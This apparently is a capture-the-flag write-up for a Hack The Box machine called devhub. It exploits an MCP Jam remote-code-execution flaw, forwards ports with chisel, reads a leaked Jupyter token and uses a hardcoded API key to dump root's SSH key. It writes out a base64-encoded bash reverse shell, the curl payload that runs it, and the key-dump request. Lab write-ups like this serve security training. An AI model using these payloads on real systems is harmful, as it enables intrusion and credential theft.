#htb #medium #mcp #mcp-jam #cve-2026-23744 #api #rce #port-forwarding #chisel #jupyter #process-enumeration #token-leak #flask #api-key-leak #ssh-keys

# Enumeration
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.55.181 -oG scan
Discovered open port 80/tcp on 10.129.55.181
Discovered open port 22/tcp on 10.129.55.181
Discovered open port 6274/tcp on 10.129.55.181
```

Opened ports: 22,80,6274

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nmap -p 22,80,6274 -sCV 10.129.55.181 -oN portscan.txt -Pn
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| GetRequest: 
|___HTTP/1.1 200 OK
```

```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.55.181 devhub.htb" | sudo tee -a /etc/hosts	
```

## MCP Jam

`devhub.htb:6274` is running an **MCP Jam** application. This service has a known vulnerability ([CVE-2026-23744](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6)).
Lets check if it's vulnerable.

The vulnerability is caused because the server listens in `0.0.0.0` (all interfaces) exposing all the endpoints.
So if the application is vulnerable the endpoint `/api/mcp/connect` must be remotely accesible.
```ts
const server = serve({
  fetch: app.fetch,
  port: SERVER_PORT,
  hostname: "0.0.0.0",
});
```

```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ curl -X POST http://devhub.htb:6274/api/mcp/connect
{"success":false,"error":"Failed to parse request body","details":"Unexpected end of JSON input"}
```
The endpoint is reachable so the application is vulnerable.

# Exploitation

## MCP Jam

The `/api/mcp/connect` endpoint allows **LLMs** to launch and communicate with different programs when required.
The problem lies in how this feature is implemented. While the commands are not restricted and the endpoint is exposed without validating the user input, anyone can control what process gets executed on the server resulting in Remote Code Execution (RCE).

Encode a bash reverse shell in **Base64**.
```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjAvNDQ0NCAwPiYxCg==
```

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ nc -lnvp 4444
```

Send a POST request to the `/api/mcp/connect` endpoint with the Base64-encoded reverse shell.
```bash
[hvidal@fedora] ~/d/h/h/m/d/scan
❯ curl -X POST http://devhub.htb:6274/api/mcp/connect \ 
      --header "Content-Type: application/json" \
      -d '{ 
    "serverConfig" :  { 
      "command" :  "/bin/bash" , 
      "args" :  [ "-c", "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMjAvNDQ0NCAwPiYxCg== | base64 -d | bash" ] , 
      "env" :  { } 
    } , 
    "serverId" :  "test" 
  }'
```

# Lateral movement

`devhub.htb` reveals that an application is running on `localhost:8888`.
Use [chisel](https://github.com/jpillora/chisel) to forward the service to the attacker's machine.

## Port forwarding

Copy the **chisel** binary to the victim machine.
- Attacker.
```bash
[hvidal@fedora] ~/d/h/h/port_forwarding
❯ python -m http.server 8080
```
- Victim.
```bash
mcp-dev@devhub:/tmp$ wget IP:8080/chisel
mcp-dev@devhub:/tmp$ chmod +x chisel
```

Forward the port to our machine.
- Attacker.
```bash
[hvidal@fedora] ~/d/h/h/port_forwarding
❯ ./chisel server --reverse -p 1234
2026/07/18 22:58:59 server: Listening on http://0.0.0.0:1234
```
- Victim.
```bash
mcp-dev@devhub:/tmp$ ./chisel client IP:1234 R:8888:127.0.0.1:8888 &
```

Now the application is displayed on `localhost:8888` in our machine.

## Jupyter

Identify the user running the **Jupyter** service.
```bash
mcp-dev@devhub:/tmp$ ps aux | grep jupyter
analyst python3 jupyter-lab --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

root /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

The `jupyter-lab` process is owned by `analyst`.
Since the authentication token is passed as a command-line argument, it is visible in the process list.

Now log in to the **Jupyter** application and select the terminal to obtain a interactive terminal as the user `analyst`.

Read the user flag.
```bash
analyst@devhub:~$ cat user.txt
```

#  Privilege escalation

## Enumeration

The command `ps aux | grep jupyter` displayed that root is running `/opt/opsmcp/server.py`. Lets check its permissions.
```bash
analyst@devhub:~$ ls -l /opt/opsmcp/server.py
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
```

Review the code of the script.
```bash
analyst@devhub:~$ cat /opt/opsmcp/server.py
```

The script starts a **Flask** application on port 5000.
The source code contains a hardcoded API key.
```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The `/tools/call` endpoint exposes multiple tools through a single API. By specifying `ops._admin_dump` as the tool name and `ssh_keys` as the target, the application returns the root SSH private key.

## Exploitation

Send a POST request to `/tools/call`, specifying `ops._admin_dump` as the tool name and `ssh_keys` as the target argument.
```bash
analyst@devhub:~$ curl -X POST 127.0.0.1:5000/tools/call \
	-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
	-H "Content-Type: application/json" \
	-d '{
	"name": "ops._admin_dump", 
	"arguments": { 
		"confirm": true, 
		"target": "ssh_keys" 
	}}'
	
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY----- .... -----END OPENSSH PRIVATE KEY-----","target":"ssh_keys"}
```

Save the private key locally.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\n .... \nOPENSSH PRIVATE KEY-----" > id_rsa
```

Set the correct permissions.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ chmod 600 id_rsa
```

Log in as root.
```bash
[hvidal@fedora] ~/d/h/h/m/d/content
❯ ssh -i id_rsa root@devhub.htb
```

Read the root flag.
```bash
root@devhub:~$ cat /root/root.txt
```